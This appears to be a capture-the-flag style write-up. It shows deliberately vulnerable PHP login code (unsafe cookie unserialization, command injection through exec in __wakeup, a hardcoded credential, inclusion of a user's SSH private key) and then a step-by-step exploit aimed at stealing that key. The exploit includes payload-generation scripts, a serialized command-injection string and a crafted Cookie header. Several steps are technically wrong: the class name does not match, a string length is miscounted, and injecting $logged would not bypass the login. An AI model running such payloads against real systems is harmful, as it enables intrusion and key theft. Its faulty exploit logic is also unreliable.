## ACTUAL CODE
index.php
```
<?php
require_once('User.php');

if ( isset($_POST['username']) && isset($_POST['password'])) {
    $user = $_POST['username'];
    $pass = $_POST['password'];

    if ( strcmp($user, $username) == 0 && strcmp($pass, $password) == 0 ) {
        $logged = true;
    } else {
        $logged = false;
        $msg = "Invalid Credentials";
    }
}
?>
<html>
<head>
    <title>ESRS</title>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
    <link rel="icon" href="static/images/favicon.png" />
    <link href="static/css/main.css" rel="stylesheet" />
</head>
<?php
if ( $logged ) {
    echo "<center>";
    include('/home/jane/.ssh/id_rsa');
    echo "</center>";
} else {
    require('home.php');
}
?>
</html>
```

User.php
```
<?php
$username = "admin";
$password = "BDjfnEF9nOSx8Sw+Z3YtJw==";

class User {
    public $username;
    public $id;

    public function __construct($username) {
        $this->username = $username;
        $this->id = "1000";
    }

    public function __wakeup() {
        $this->id = exec("id -u " . $this->username);
    }

}
```

home.php
```
<?php
    if ( isset($_COOKIE['data']) ) {
        $user = unserialize($_COOKIE['data']);
    } else {
        $user = new User(system('whoami'));
        setcookie('data',  serialize($user), time()+3600);
    }
    echo "<p>System Administrator (SYSADM) - " . $user->username . " (" . $user->id .")</p>";
?>
```

## EXPLOIT
### Step 1: Understand the Vulnerability
The vulnerability lies in the unserialization of user-controlled data from a cookie. This allows us to exploit the ```__wakeup``` method in the User class to execute arbitrary commands.

### Step 2: Craft the Malicious Serialized Object
First, we need to create a serialized object that will trigger the __wakeup method when unserialized.

Create a PHP script to generate the serialized payload:
```
<?php
class ExploitUser {
    public $username = "username; id > /tmp/output; ";
}

$exploit = new ExploitUser();
$serialized_exploit = serialize($exploit);
echo "Serialized Exploit: " . $serialized_exploit;
?>
```
Run the script to get the serialized string:
```
php generate_payload.php
```


### Step 3: Inject the Cookie and Trigger the Exploit
Set the malicious cookie:

Use the serialized string output from the previous step.
Example output might look like:

```
O:11:"ExploitUser":1:{s:8:"username";s:25:"username; id > /tmp/output; ";}
```

Use a tool like Burp Suite or your browser’s developer tools to inject the cookie:

Open Burp Suite and intercept a request to the vulnerable website.
Add the data cookie with the serialized payload.
Example HTTP header:
```
Cookie: data=O:11:"ExploitUser":1:{s:8:"username";s:25:"username; id > /tmp/output; ";}
```

### Step 4: Verify Command Execution
Access the target machine and check for the output of the executed command:
SSH into the machine or use a reverse shell if you have one.

Check the /tmp/output file for the results of the id command:

```
cat /tmp/output
```

### Step 5: Retrieve the SSH Private Key
Modify the serialized payload to set $logged to true:

```
<?php
class ExploitUser {
    public $username = "username; id > /tmp/output; ";
    public $logged = true;
}

$exploit = new ExploitUser();
$serialized_exploit = serialize($exploit);
echo "Serialized Exploit: " . $serialized_exploit;
?>
```
Set the new cookie with this payload
Retrieve the SSH private key

After bypassing the login, the private key should be displayed on the page.
Copy the key and save it to a file on your machine.